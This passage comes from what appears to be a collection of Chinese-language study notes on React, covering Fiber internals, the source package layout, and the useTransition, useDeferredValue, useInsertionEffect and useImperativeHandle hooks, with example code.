树的基本结构，使 ==React 能够在树中进行遍历和更新==。\n\n### 2.3. 工作单元相关属性\n\n```javascript\nclass FiberNode {\n  pendingProps: any;      // 新的待处理 props\n  memoizedProps: any;     // 上一次渲染使用的 props\n  updateQueue: UpdateQueue<any> | null;  // 更新队列\n  memoizedState: any;     // 上一次渲染使用的 state\n  dependencies: Dependencies | null;  // 依赖项（context、事件等）\n}\n```\n\n这些属性用于管理组件的状态和属性更新，是实现组件渲染和更新的核心。\n\n### 2.4. 副作用相关属性\n\n```javascript\nclass FiberNode {\n  flags: Flags;          // 副作用标记（需要执行的操作类型）\n  subtreeFlags: Flags;   // 子树的副作用标记\n  deletions: Array<Fiber> | null;  // 需要删除的子节点\n  lanes: Lanes;          // 优先级相关\n  childLanes: Lanes;     // 子节点的优先级\n}\n```\n\n这些属性用于标记和追踪需要在 ==commit 阶段==执行的副作用操作。\n\n### 2.5. 调度相关属性\n\n```javascript\nclass FiberNode {\n  alternate: Fiber | null;  // 指向内存中另一个版本的 fiber\n  nextEffect: Fiber | null; // 指向下一个有副作用的 fiber\n  firstEffect: Fiber | null; // 子树中第一个有副作用的 fiber\n  lastEffect: Fiber | null;  // 子树中最后一个有副作用的 fiber\n}\n```\n\n这些属性用于实现 React 的==双缓冲机制==和==副作用链表==，支持==增量渲染和优先级调度==\n\n### 2.6. 属性的使用场景\n\n#### 2.6.1. 渲染阶段\n\n```javascript\nfunction beginWork(current: Fiber | null, workInProgress: Fiber) {\n  // 使用 tag 确定组件类型\n  switch (workInProgress.tag) {\n    case FunctionComponent: {\n      // 处理函数组件\n      const Component = workInProgress.type;\n      const props = workInProgress.pendingProps;\n      // ...\n    }\n    // ...其他类型处理\n  }\n}\n```\n\n#### 2.6.2. 提交阶段\n\n```javascript\nfunction commitWork(current: Fiber | null, finishedWork: Fiber) {\n  // 根据 flags 执行相应的 DOM 操作\n  if (finishedWork.flags & Update) {\n    // 更新 DOM\n    const instance = finishedWork.stateNode;\n    // ...\n  }\n}\n```\n\n#### 2.6.3. 调度优先级\n\n```javascript\nfunction markUpdateLaneFromFiberToRoot(fiber: Fiber) {\n  // 设置更新优先级\n  fiber.lanes = mergeLanes(fiber.lanes, lane);\n  let alternate = fiber.alternate;\n  if (alternate !== null) {\n    alternate.lanes = mergeLanes(alternate.lanes, lane);\n  }\n  // ...\n}\n```\n\n### 2.7. 重要注意点\n\n1. **性能影响**\n   - 属性访问应该避免深层遍历\n   - 合理使用 memoization 减少不必要的更新\n   - 注意内存占用，及时清理不需要的引用\n\n2. **调试技巧**\n   - 使用 React DevTools 查看 Fiber 树结构\n   - 通过 flags 追踪更新过程\n   - 监控 lanes 了解优先级变化 \n\n3. **常见陷阱**\n   - 避免直接修改 Fiber 节点属性\n   - 注意处理 null 值\n   - 正确处理副作用清理 \n\n通过深入理解这些属性，我们可以更好地理解 React 的工作原理，编写更高效的 React 应用。","yHtGkzJg":"\n# React 的源码结构分析\n\n`#react` \n\n## 目录\n<!-- toc -->\n ## 总结 \n\n- 使用 yarn 的多包管理\n- 再读一遍\n\n## 1. 主要目录结构\n```bash\nreact/\n├── fixtures/        # 测试固件，包含一些测试用例\n├── packages/        # 核心包目录，包含主要源码\n├── scripts/        # 构建和开发脚本\n└── docs/           # 文档（已迁移到独立仓库）\n```\n\n## 2. packages 目录（核心代码）\n\n```bash\npackages/\n├── react/                     # React 核心库\n├── react-dom/                 # DOM 渲染器\n├── react-reconciler/          # 协调器实现\n├── react-native-renderer/     # React Native 渲染器\n├── scheduler/                 # 调度器\n├── shared/                    # 共享工具代码\n└── react-is/                  # 类型检查工具\n```\n\n## 3. 各个核心包的功能分析\n\n### 3.1. react 包（packages/react/）\n\n```bash\nreact/\n├── src/\n│   ├── React.js              # React 对外接口\n│   ├── ReactElement.js       # createElement 实现\n│   ├── ReactHooks.js        #  Hooks 实现\n│   └── ReactContext.js      # Context 实现\n```\n功能：\n- 提供核心 API\n- 定义组件基类\n- 实现 Hooks\n- 提供 Context 功能\n\n### 3.2. react-dom 包（packages/react-dom/）\n\n```bash\nreact-dom/\n├── src/\n│   ├── client/              # 客户端渲染相关\n│   ├── server/              # 服务端渲染相关\n│   └── events/              # 事件系统\n```\n\n功能：\n- 处理 DOM 操作\n- 实现事件系统\n- 提供服务端渲染\n- 管理生命周期\n\n### 3.3. react-reconciler 包（packages/react-reconciler/）\n\n```bash\nreact-reconciler/\n├── src/\n│   ├── ReactFiber.js           # Fiber 节点结构\n│   ├── ReactFiberWorkLoop.js   # 工作循环\n│   ├── ReactUpdateQueue.js     # 更新队列\n│   └── ReactFiberReconciler.js # 协调器实现\n```\n\n功能：\n- 实现虚拟 DOM\n- Fiber 架构实现\n- Diff 算法\n- 更新调度\n\n### 3.4. scheduler 包（packages/scheduler/）\n\n```bash\nscheduler/\n├── src/\n│   ├── Scheduler.js            # 调度器实现\n│   ├── SchedulerPriorities.js  # 优先级管理\n│   └── SchedulerHostConfig.js  # 宿主环境配置\n```\n\n功能：\n- 任务调度\n- 优先级管理\n- 时间分片\n- 并发模式支持\n\n## 4. shared 包（packages/shared/）\n\n```bash\nshared/\n├── ReactSymbols.js        # React 内部 Symbol 定义\n├── ReactTypes.js          # 类型定义\n└── ReactFeatureFlags.js   # 特性开关\n```\n\n功能：\n- 共享常量\n- 工具函数\n- 类型定义\n- 特性标记\n\n## 5. 核心流程和关系\n\n![图片&文件](./files/20241031-26.png)\n\n````mermaid\n  graph TB\n    subgraph Application\n        App[应用代码]\n    end\n    \n    subgraph React Core\n        ReactAPI[React API]\n        Hooks[Hooks]\n        Context[Context]\n    end\n    \n    subgraph Reconciliation\n        Reconciler[Reconciler]\n        Fiber[Fiber Tree]\n        Diff[Diff 算法]\n    end\n    \n    subgraph Rendering\n        ReactDOM[React DOM]\n        RNRenderer[RN Renderer]\n    end\n    \n    subgraph Scheduling\n        Scheduler[Scheduler]\n        Priority[Priority Queue]\n    end\n    \n    App --> ReactAPI\n    ReactAPI --> Reconciler\n    Hooks --> Reconciler\n    Context --> Reconciler\n    Reconciler --> Fiber\n    Fiber --> Diff\n    Diff --> Scheduler\n    Scheduler --> Priority\n    Priority --> ReactDOM\n    Priority --> RNRenderer\n    \n    style Application fill:#f9f,stroke:#333,stroke-width:2px\n    style React Core fill:#bbf,stroke:#333,stroke-width:2px\n    style Reconciliation fill:#bfb,stroke:#333,stroke-width:2px\n    style Rendering fill:#fbb,stroke:#333,stroke-width:2px\n    style Scheduling fill:#ffb,stroke:#333,stroke-width:2px\n````\n\n- 应用层：即 ==React 入口==\n\t- 开发者编写的应用代码\n\t- 使用 React API 创建组件和元素\n- React 核心层：\n\t- 处理组件定义和基础抽象\n\t- 管理 Hooks 和 Context\n\t- 提供核心 API 接口\n- ==协调层==：\n\t- 维护 Fiber 树结构\n\t- 执行 ==Diff 算法==\n\t- 计算更新内容\n- 调度层：\n\t- 管理任务优先级\n\t- 控制更新时机\n\t- 实现==时间分片==\n- 渲染层：\n\t- 执行实际的 DOM 操作\n\t- 处理平台特定的渲染逻辑\n\n## 6. 重要概念和实现\n\n- Fiber 架构：\n\t- 实现可中断的更新\n\t- 支持优先级调度\n\t- 更好的性能和用户体验\n- 并发模式：\n\t- 支持任务中断和恢复\n\t- 实现时间切片\n\t- 优化用户交互体验\n- 调度系统：\n\t- 基于优先级的任务调度\n\t- 支持==异步渲染==\n\t- 实现==可中断更新==\n","oielQ5IK":"\n# 使用 useTransition 进行非阻塞渲染\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- useTransition 是 React 18 引入的一个强大的性能优化 Hook\n\t- 它允许我们==将某些更新标记为非紧急的过渡更新==\n\t- API：`  const [isPending, startTransition] = useTransition();`\n- 使用场景\n\t- 选项卡切换\n\t- 输入框高于搜索结果，搜索结果使用 `startTransition` 包装\n\t- 使用 startTransition 来包装==路由切换==\n- 注意点\n\t- 传递给`startTransition`的函数==必须是同步的，而不能是异步的==\n- 优势\n\t- **避免阻塞**：防止大型更新阻塞用户输入\n\t- **优先级管理**：自动处理更新优先级\n\t- **更流畅的体验**：减少界面卡顿和延迟 \n\n## 2. 基本概念\n\nuseTransition 是 React 18 引入的一个强大的性能优化 Hook，它允许我们**将某些更新标记为非紧急的过渡更新**。\n\n```typescript\nconst [isPending, startTransition] = useTransition();\n```\n\n- `isPending`: 布尔值，表示过渡状态是否处于进行中\n- `startTransition`: \n\t- 当你希望启动一个新的过渡状态时调用它\n\t- 用于包装需要标记为过渡更新的状态更新函数 \n\t- 当你使用`startTransition`函数进行状态更新时\n\t\t- 你实际上告诉 React：**这个更新不是非常紧急的**\n\t\t- 如果有更重要的更新要处理，你可以中断或延后这个次要更新\n\n## 3. 主要用途\n\n- 处理大量数据更新\n\t- 避免界面卡顿\n\t- 保持用户界面响应\n\t- 优化用户体验\n- 并发渲染控制\n\t- 区分紧急和非紧急更新\n\t- 优化渲染优先级\n\t- 提供更流畅的交互\n- **智能调度**\n\t- 自动批处理更新\n\t- 优化渲染时机\n\t- 减少不必要的渲染\n- **避免阻塞**\n\t- 保持输入响应性\n\t- 防止 UI 冻结\n\t- 改善用户体验\n\n## 4. 与 useDeferredValue 的比较\n\n- **useTransition**\n\t- 直接控制状态更新\n\t- 适用于触发更新的地方\n\t- 提供 pending 状态\n- **useDeferredValue**\n\t- 延迟值的更新\n\t- **适用于接收值**的地方\n\t- 不提供 pending 状态\n\n## 5. 注意事项\n\n- `useTransition`仅在开启==React 并发模式==的时候才有效\n\n```javascript\n// React v18以前\nReactDOM.render(<app />, rootNode) // ❌ 无法开启useTransition\n \n// React v18\nReactDOM.createRoot(rootNode).render(<app />) // ✅ 开启useTransition\n```\n\n- 只有当你能访问某个状态的`set函数`时，你才能将更新包装进`useTransition`中\n\n- 传递给`startTransition`的函数**必须是同步的，而不能是异步的**。\n\n```javascript\nstartTransition(async () => {\n  await someAsyncFunction();\n  // ❌ Setting state *after* startTransition call\n  setPage('/about');\n});\n \nawait someAsyncFunction();\nstartTransition(() => {\n  // ✅ Setting state *during* startTransition call\n  setPage('/about');\n});\n```\n\n- 不能用于控制文本输入。因为输入框是需要实时更新的，如果用`useTransition`降低了渲染优先级，可能造成输入“卡顿”。\n\n- 不要在`startTransition`内部使用`setTimeout`，如果一定要用`setTimeout`，你可以在`startTransition`外层使用\n\n```javascript\nstartTransition(() => {\n  // ❌ Setting state *after* startTransition call\n  setTimeout(() => {\n    setPage('/about');\n  }, 1000);\n});\n \nsetTimeout(() => {\n  startTransition(() => {\n    // ✅ Setting state *during* startTransition call\n    setPage('/about');\n  });\n}, 1000);\n```\n\n- 前面说到很多次“中断或延后更新”，那么什么时候中断，什么时候延后更新？\n\t- 最简单的理解：\n\t\t- 被`useTransition`包裹的同一个状态多次更新，只会渲染最后一个，前面的都算中断（仅UI层面，如：长列表多次请求）；\n\t- 不同组件触发不同状态的更新，被`useTransition`包裹的状态优先级较低，被中断后会等高优先级的状态更新完成后继续更新（如：复杂图表渲染被中断，会在高优先级状态更新后，继续处理图表的渲染）。\n\n## 6. 实际应用示例\n\n### 6.1. 示例1：选项卡切换\n\n如下代码，这样我们快速切换tab，无论点到哪一个tab都不会卡顿\n\n```javascript hl:9,17\nfunction Tabs() {\n  const [tab, setTab] = useState('home');\n  const [isPending, startTransition] = useTransition();\n\n  return (\n    <>\n      <TabButton \n        onClick={() => {\n          startTransition(() => {\n            setTab('home');\n          });\n        }}>\n        Home\n      </TabButton>\n      <TabButton \n        onClick={() => {\n          startTransition(() => {\n            setTab('posts');\n          });\n        }}>\n        Posts\n      </TabButton>\n      {isPending ? (\n        <Spinner />\n      ) : (\n        <TabContent tab={tab} />\n      )}\n    </>\n  );\n}\n\n```\n\n### 6.2. 示例 2：输入框优先级高于搜索结果，立即更新\n\n```typescript hl:6,9\nfunction SearchResults() {\n  const [query, setQuery] = useState('');\n  const [isPending, startTransition] = useTransition();\n\n  const updateQuery = (e) => {\n    // 立即更新输入框\n    setQuery(e.target.value);\n    \n    // 将搜索结果更新标记为过渡\n    startTransition(() => {\n      // 复杂的搜索逻辑\n      performSearch(e.target.value);\n    });\n  };\n\n  return (\n    <div>\n      <input value={query} onChange={updateQuery} />\n      {isPending ? (\n        <div>Loading...</div>\n      ) : (\n        <SearchResults />\n      )}\n    </div>\n  );\n}\n```\n\n### 6.3. 示例 3： `useTransition`和`Suspense`实现路由流畅切换\n\n```jsx hl:5,9,39\nimport React, { useState } from 'react';\nimport { BrowserRouter, Switch, Route, Link } from 'react-router-dom';\n \nconst [location, setLocation] = useState(window.location);\nconst [isPending, startTransition] = React.unstable_useTransition();\n \n// 使用 startTransition 来更新 location 状态，能够延迟显示新页面的内容，直到数据加载完毕\nfunction handleNavigation(newLocation) {\n  startTransition(() => {\n    setLocation(newLocation);\n  });\n}\n \nfunction CustomLink({ to, children }) {\n  return (\n    <a\n      href={to}\n      onClick={(event) => {\n        event.preventDefault();\n        handleNavigation(to);\n      }}\n    >\n      {children}\n    </a>\n  );\n}\n \n// 主应用组件\nfunction App() {\n  return (\n    <div>\n      <BrowserRouter>\n        {/* 导航 */}\n        <nav>\n          <CustomLink to=\"/about\">About</CustomLink>\n          <CustomLink to=\"/contact\">Contact</CustomLink>\n        </nav>\n \n        {/* 使用 React.Suspense 来处理组件的懒加载 */}\n        <React.Suspense fallback={<LoadingIndicator />}>\n          <Switch location={location}>\n            <Route path=\"/about\" component={AboutPage} />\n            <Route path=\"/contact\" component={ContactPage} />\n            {/* ...其他路由... */}\n          </Switch>\n        </React.Suspense>\n \n        {/* 使用 isPending 显示或隐藏全局加载指示器 */}\n        {isPending && <LoadingIndicator />}\n      </BrowserRouter>\n    </div>\n  );\n}\n \nexport default App;\n```\n\n## 7. 使用场景\n\n- **复杂数据过滤**：处理大型列表的过滤和搜索\n- **切换视图**：在不同视图之间平滑过渡\n- **数据可视化**：更新大型图表或数据集\n- **延迟加载**：处理异步内容加载 \n\n## 8. 性能优势\n\n- **避免阻塞**：防止大型更新阻塞用户输入\n- **优先级管理**：自动处理更新优先级\n- **更流畅的体验**：减少界面卡顿和延迟 \n\n## 9. 最佳实践\n\n### 9.1. **识别非紧急更新**\n\n  ```typescript\n  // 好的使用方式\n  startTransition(() => {\n    setFilteredItems(computeExpensiveFiltering(items));\n  });\n  ```\n\n### 9.2. **结合 Suspense**\n\n  ```typescript\n  <Suspense fallback={<Loading />}>\n    {isPending ? <OldContent /> : <NewContent />}\n  </Suspense>\n  ``` \n\n## 10. 使用建议\n\n1. 优先考虑以下场景使用 useTransition：\n    - 大数据列表渲染\n    - 复杂计算操作\n    - 频繁状态更新\n2. 避免在以下情况使用：\n    - 简单的状态更新\n    - 不需要优化的操作\n    - 紧急的用户反馈\n3. 结合其他优化手段：\n    - 虚拟列表\n    - 数据分页\n    - 缓存策略\n\n## 11. 性能优化技巧\n\n### 11.1. 分批处理更新\n\n  ```typescript\n  startTransition(() => {\n    // 将大型更新分成小批次\n    for (let i = 0; i < items.length; i += 100) {\n      const batch = items.slice(i, i + 100);\n      processItems(batch);\n    }\n  });\n  ```\n\n### 11.2. 条件使用\n\n  ```typescript\n  const handleChange = (e) => {\n    if (isComplexUpdate) {\n      startTransition(() => updateState(e.target.value));\n    } else {\n      updateState(e.target.value);\n    }\n  };\n  ``` \n\n","ARMCLfFf":"\n# 使用 useDeferredValue  来延迟状态更新\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- useDeferredValue 与 useTransition\n\t- **使用场景**\n\t\t- useDeferredValue\n\t\t\t- 适用于`值`的延迟\n\t\t\t- 把特定状态的更新标记为`低优先级`\n\t\t- useTransition：\n\t\t\t- 适用于`状态更新`的优先级 \n\t\t\t- 关注点是 ==状态的过渡==\n\t- **控制方式**\n\t\t- useDeferredValue\n\t\t\t- `被动`控制\n\t\t- useTransition\n\t\t\t- `主动`控制 \n\t- **应用方式**\n\t\t- useDeferredValue：直接应用于`值`\n\t\t\t- 具体的 state 比如 `xxx`\n\t\t- useTransition：\n\t\t\t- 包装`状态更新函数` \n\t\t\t\t- 包装具体的状态更新函数\n\t\t\t\t\t- 比如 `setXxx`\n\t- 注意点\n\t\t- 和`useTransition`一样，`useDeferredValue`==只会中断或延迟UI的渲染==，**不会阻止网络请求**\n\t\t- 仅在==并发模式==下生效\n- useDeferredValue 使用案例\n\t- 实时搜索的==搜索结果展示组件==\n\t- 数据可视化的，==chart 图展示==\n\t- 实时文本的 ==预览文本展示==\n- useDeferredValue 工作原理\n\t- **延迟处理**\n\t\t- 创建==值的延迟副本==\n\t\t- 优先处理紧急更新\n\t\t- 在==空闲时间==处理延迟值 \n\t- **性能优化**\n\t\t- 避免阻塞主线程\n\t\t- 提高用户交互响应性\n\t\t- 平滑处理大量数据更新 \n\n## 2. `useTransition`和`useDeferredValue`的差异\n\n- `useTransition`主要关注点是**状态的过渡**。\n\t- 它允许开发者控制某个更新的延迟更新，还提供了过渡标识，让开发者能够添加过渡反馈。\n- `useDeferredValue`主要关注点是**单个值的延迟更新**。\n\t- 它允许你把特定状态的更新标记为`低优先级`。\n\n## 3. 定义和基本概念\n\nuseDeferredValue 是 React 18 引入的一个 Hook，它允许我们**延迟更新 UI 的某些部分**。这个 Hook 接收一个值并返回该值的延迟版本：\n\n```javascript\nconst deferredValue = useDeferredValue(value);\n```\n\n它的主要作用是在处理大量数据或复杂计算时，通过延迟非关键更新来保持 UI 的响应性 \n\n## 4. 工作原理\n\n- **延迟处理**\n\t- 创建值的延迟副本\n\t- 优先处理紧急更新\n\t- 在空闲时间处理延迟值 \n- **性能优化**\n\t- 避免阻塞主线程\n\t- 提高用户交互响应性\n\t- 平滑处理大量数据更新 \n\n## 5. 主要使用场景\n\n- **大数据展示**\n\t- 长列表渲染\n\t- 实时搜索\n\t- 数据过滤 \n- **复杂计算**\n\t- 图表更新\n\t- 数据分析\n\t- 动态表格 \n- **用户输入处理**\n   - 自动完成\n   - 实时预览\n   - 表单验证 \n\n## 6. 实际使用案例\n\n### 6.1. 案例1：实时搜索\n\n> 搜索结果可以往后延迟\n\n```javascript hl:3,12,19\nfunction SearchComponent() {\n  const [query, setQuery] = useState('');\n  const deferredQuery = useDeferredValue(query);\n  \n  return (\n    <div>\n      <input\n        value={query}\n        onChange={(e) => setQuery(e.target.value)}\n        placeholder=\"搜索...\"\n      />\n      <SearchResults query={deferredQuery} />\n    </div>\n  );\n}\n\nfunction SearchResults({ query }) {\n  const results = useMemo(() => {\n    // 复杂的搜索逻辑\n    return performExpensiveSearch(query);\n  }, [query]);\n\n  return (\n    <ul>\n      {results.map(item => (\n        <li key={item.id}>{item.name}</li>\n      ))}\n    </ul>\n  );\n}\n```\n\n### 6.2. 案例2：数据可视化\n\n```javascript hl:3,12,18\nfunction DataVisualization() {\n  const [data, setData] = useState([]);\n  const deferredData = useDeferredValue(data);\n\n  const handleDataUpdate = (newData) => {\n    setData(newData);\n  };\n\n  return (\n    <div>\n      <DataControls onUpdate={handleDataUpdate} />\n      <Chart data={deferredData} />\n    </div>\n  );\n}\n\nfunction Chart({ data }) {\n  // 使用 useMemo 优化复杂的图表计算\n  const chartConfig = useMemo(() => {\n    return generateChartConfig(data);\n  }, [data]);\n\n  return <ChartComponent config={chartConfig} />;\n}\n```\n\n### 6.3. 案例3：实时文本预览\n\n```javascript hl:3,12,19\nfunction MarkdownEditor() {\n  const [text, setText] = useState('');\n  const deferredText = useDeferredValue(text);\n\n  return (\n    <div className=\"editor-container\">\n      <textarea\n        value={text}\n        onChange={(e) => setText(e.target.value)}\n        placeholder=\"输入 Markdown 文本...\"\n      />\n      <MarkdownPreview text={deferredText} />\n    </div>\n  );\n}\n\nfunction MarkdownPreview({ text }) {\n  const html = useMemo(() => {\n    return convertMarkdownToHtml(text);\n  }, [text]);\n\n  return <div dangerouslySetInnerHTML={{ __html: html }} />;\n}\n```\n\n## 7. 使用的注意事项\n\n- `useDeferredValue` 仅在**开启React并发模式**的时候才有效\n- 传递给`useDeferredValue`的值应该是**原始值**（如字符串和数字）或**在渲染外部创建的对象**\n- 当同一个`useDeferredValue`在渲染前接收到多次不同的值时，只有**最后一个会被渲染**\n- 和`useTransition`一样，`useDeferredValue`==只会中断或延迟UI的渲染==，**不会阻止网络请求**。\n   \n\n## 8. 使用的好处、与防抖与节流的区别\n\n- 它与React深度集成，可以适应用户的设备。\n\t- 如果设备性能好，延迟的重新渲染会很快完成；\n\t- 如果设备性能差，重新渲染会相应地延迟。\n- 它不需要选择固定的延迟，与防抖和节流不同。\n\t- **防抖与节流的局限性**：\n\t\t- 这两种方法都是为了控制函数的执行频率，但它们是阻塞的，可能会导致不流畅的用户体验。\n- 由`useDeferredValue`执行的重新渲染是可中断的\n\t- 这意味着在React重新渲染期间，如果发生了其他更新，React会中断当前的渲染并处理新的更新。\n\n## 9. 与 useTransition 的区别\n\n- **使用场景**\n\t- useDeferredValue：\n\t\t- 适用于`值`的延迟\n\t- useTransition：\n\t\t- 适用于`状态更新`的优先级 \n- **控制方式**\n\t- useDeferredValue：\n\t\t- `被动`控制\n\t- useTransition：\n\t\t- `主动`控制 \n- **应用方式**\n\t- useDeferredValue：直接应用于`值`\n\t\t- 具体的 state 比如 `xxx`\n\t- useTransition：\n\t\t- 包装`状态更新函数` \n\t\t\t- 包装具体的状态更新函数，比如 `setXxx`\n\n","oxc4FMsB":"\n# 使用 useInsertionEffect 注入 css-in-js\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- useInsertionEffect 是 React 18 引入的一个特殊的 Effect Hook\n\t- 它的执行时机比 `useLayoutEffect` 和 `useEffect` 都要早\n\t- 其主要目的是用于 CSS-in-JS 库**在 DOM 变更之前注入样式** \n- 执行顺序如下：\n\t1. useInsertionEffect\n\t2. useLayoutEffect\n\t3. useEffect\n\n## 2. 定义和基本概念\n\nuseInsertionEffect 是 React 18 引入的一个特殊的 Effect Hook，它的执行时机比 `useLayoutEffect` 和 `useEffect` 都要早。其主要目的是用于 CSS-in-JS 库**在 DOM 变更之前注入样式** \n\n基本语法：\n\n```javascript\nuseInsertionEffect(setup, dependencies?)\n```\n\n## 3. 执行时机\n\n执行顺序如下：\n1. useInsertionEffect\n2. useLayoutEffect\n3. useEffect\n\n这个顺序设计使得它**特别适合在 DOM 变更之前插入样式，避免了布局抖动的问题**\n\n## 4. 主要使用场景\n\n- **CSS-in-JS 库的样式注入**\n\t- styled-components\n\t- Emotion\n\t- 其他动态样式库\n- **性能关键的样式操作**\n\t- 动态主题切换\n\t- 关键样式注入\n\t- 样式优先级处理 \n- **特殊的 DOM 操作**\n\t- 需要在布局计算前执行的操作\n\t- 样式表动态插入\n\t- 性能敏感的 DOM 修改 \n\n## 5. 实际使用案例\n\n### 5.1. 案例1：基本的样式注入\n\n```javascript hl:5,8\nfunction StyleInjector({ styles }) {\n  useInsertionEffect(() => {\n    const style = document.createElement('style');\n    style.innerHTML = styles;\n    document.head.appendChild(style);\n    \n    return () => {\n      document.head.removeChild(style);\n    };\n  }, [styles]);\n\n  return null;\n}\n```\n\n### 5.2. 案例2：简单的 CSS-in-JS 实现\n\n```javascript\nfunction DynamicStyles({ className, rules }) {\n  useInsertionEffect(() => {\n    const styleSheet = new CSSStyleSheet();\n    styleSheet.replaceSync(rules);\n    document.adoptedStyleSheets = [...document.adoptedStyleSheets, styleSheet];\n\n    return () => {\n      document.adoptedStyleSheets = document.adoptedStyleSheets\n        .filter(sheet => sheet !== styleSheet);\n    };\n  }, [rules]);\n\n  return <div className={className}>{/* content */}</div>;\n}\n```\n\n### 5.3. 案例3：主题切换实现\n\n```javascript hl:9\nfunction ThemeProvider({ theme, children }) {\n  useInsertionEffect(() => {\n    const styleElement = document.createElement('style');\n    styleElement.setAttribute('data-theme', theme);\n    styleElement.textContent = generateThemeCSS(theme);\n    document.head.appendChild(styleElement);\n\n    return () => {\n      document.head.removeChild(styleElement);\n    };\n  }, [theme]);\n\n  return <>{children}</>;\n}\n```\n\n## 6. 注意事项\n\n- 不能访问 refs\n- 专注于样式注入\n- 做好清理工作\n- 保持简单的逻辑\n- 不能使用 DOM APIs（除了样式注入）\n- 不能更新状态\n- 仅用于必要的样式注入\n- 注意清理工作 \n- 避免复杂计算\n- 防止 XSS 攻击\n- 清理无用样式\n- 验证样式内容\n\n### 6.1. 注意事项的详细说明\n\n- `useInsertionEffect`只在客户端运行，不能在服务器渲染期间运行。\n- 不能从`useInsertionEffect`中更新状态。\n\t- 这是因为`useInsertionEffect`专为**插入操作**设计的，\n\t- 而不是为响应式状态变化设计的。\n\t- 如果在`useInsertionEffect`里更新状态，会造成组件重新渲染。\n- 当`useInsertionEffect`运行时，`refs`还没有附加。\n\t- 如果你试图在`useInsertionEffect`中访问ref，你可能会得到`null`或未定义的值。\n- `useInsertionEffect`可能在DOM更新之前或之后运行，所以不能依赖于DOM在特定时刻的更新状态。\n\t- 这是因为`useInsertionEffect`的设计初衷是在任何布局效果触发之前插入元素，但它并不保证在 DOM 的任何特定更新之前或之后运行。\n\t- 因此，依赖于DOM在特定时刻的状态可能导致不可预测的行为。\n\t\t- 例如：假设你希望在`useInsertionEffect`中检查某个元素的尺寸。但由于 DOM 可能尚未更新，所以你得到的尺寸可能是旧的或不准确的。\n\n","YBfDZfrV":"\n# 使用 useImperativeHandle 精确控制组件对外暴露能力\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- `useImperativeHandle` 是 React 提供的一个高级 Hook\n\t- 它可以让你自定义通过 ref 暴露给父组件的==实例值==\n\t- 它通常与 `forwardRef` 一起使用，用于向父组件暴露==特定的方法或属性==\n- 对比 Vue 的 `defineExpose()`，这样==方便理解==\n\n## 2. 定义和基本概念\n\n`useImperativeHandle` 是 React 提供的一个高级 Hook，**它可以让你自定义通过 ref 暴露给父组件的实例值。它通常与 forwardRef 一起使用，用于向父组件暴露特定的方法或属性**\n\nuseImperativeHandle 是一个强大但应谨慎使用的 Hook。它主要用于需要精确控制组件对外暴露的实例值的场景。\n- 在大多数情况下，我们应该**优先考虑使用 props 和状态管理来处理组件间的通信**。\n- 只有在确实需要命令式编程接口时，才考虑使用 useImperativeHandle。\n- 使用时要注意性能影响，并保持代码的可维护性\n\n### 2.1. 基本语法\n\n```javascript\nuseImperativeHandle(ref, createHandle, dependencies?)\n```\n\n## 3. 使用原则\n\n- 如果使用 props 可以解决的场景都不要使用 refs，也就无需使用`useImperativeHandle`\n- 状态提升可以解决的问题,就别用\n\n## 4. 主要使用场景\n\n- 自定义暴露的 ref 内容\n\t- 限制子组件暴露的方法\n\t- 提供自定义的接口\n\t- 封装复杂的操作\n- 组件通信\n\t- 父组件需要调用子组件方法\n\t- 跨组件操作\n\t- 命令式交互\n- DOM 操作封装\n\t- 封装 DOM 操作\n\t- 提供统一的接口\n\t- 控制访问权限 \n\n## 5. 实际使用案例\n\n### 5.1. 案例1：基本的表单控制\n\n想象一个简单的例子，你有一个自定义输入组件，你想为其提供一个方法来清除输入内容，但不想暴露整个组件或 DOM 节点\n\n```javascript hl:6,26,28\nimport React, { forwardRef, useImperativeHandle, useRef } from 'react';\n\nconst CustomInput = forwardRef((props, ref) => {\n  const inputRef = useRef();\n\n  useImperativeHandle(ref, () => ({\n    focus: () => {\n      inputRef.current.focus();\n    },\n    clear: () => {\n      inputRef.current.value = '';\n    },\n    getValue: () => {\n      return inputRef.current.value;\n    }\n  }));\n\n  return <input ref={inputRef} {...props} />;\n});\n\n// 父组件使用\nfunction Form() {\n  const inputRef = useRef();\n\n  const handleSubmit = () => {\n    const value = inputRef.current.getValue();\n    console.log(value);\n    inputRef.current.clear();\n  };\n\n  return (\n    <div>\n      <CustomInput ref={inputRef} />\n      <button onClick={handleSubmit}>提交</button>\n    </div>\n  );\n}\n```\n\n### 5.2. 案例2：复杂动画控制\n\n```javascript\nconst AnimatedComponent = forwardRef((props, ref) => {\n  const elementRef = useRef();\n  const [isPlaying, setIsPlaying] = useState(false);\n\n  useImperativeHandle(ref, () => ({\n    play: () => {\n      setIsPlaying(true);\n      elementRef.current.classList.add('animate');\n    },\n    pause: () => {\n      setIsPlaying(false);\n      elementRef.current.classList.remove('animate');\n    },\n    reset: () => {\n      setIsPlaying(false);\n      elementRef.current.classList.remove('animate');\n      elementRef.current.style.transform = 'translateX(0)';\n    },\n    isPlaying: () => isPlaying\n  }));\n\n  return <div ref={elementRef}>{props.children}</div>;\n});\n```\n\n### 5.3. 案例3：模态框控制\n\n```javascript\nconst Modal = forwardRef((props, ref) => {\n  const [isVisible, setIsVisible] = useState(false);\n  const [content, setContent] = useState('');\n\n  useImperativeHandle(ref, () => ({\n    open: (modalContent) => {\n      setContent(modalContent);\n      setIsVisible(true);\n    },\n    close: () => {\n      setIsVisible(false);\n    },\n    updateContent: (newContent) => {\n      setContent(newContent);\n    }\n  }));\n\n  if (!isVisible) return null;\n\n  return (\n    <div className=\"modal\">\n      <div className=\"modal-content\">\n        {content}\n        <button onClick={() => ref.current.close()}>关闭</button>\n      </div>\n    </div>\n  );\n});\n```\n\n## 6. 与其他特性的配合\n\n- 与 `forwardRef` 配合\n\t- 必须配合使用\n\t- 传递 ref 对象\n\t- 处理 ref 转发\n- 与 `useRef` 配合\n\t- 内部状态管理\n\t- DOM 引用\n\t- 值的持久化 \n\n## 7. 优势和局限\n\n### 7.1. 优势\n\n使用 `useImperativeHandle`可以带来的好处\n\n- **更好的封装**：你可以只暴露你想让父组件访问的特定方法或属性。\n- **更多的控制**：你可以精确控制组件的行为，而不是依赖于状态或属性的变化。\n\n### 7.2. 风险\n\n它的局限性及潜在风险\n\n- **过度使用**：过度依赖`useImperativeHandle`可能会导致代码难以理解和维护。\n- 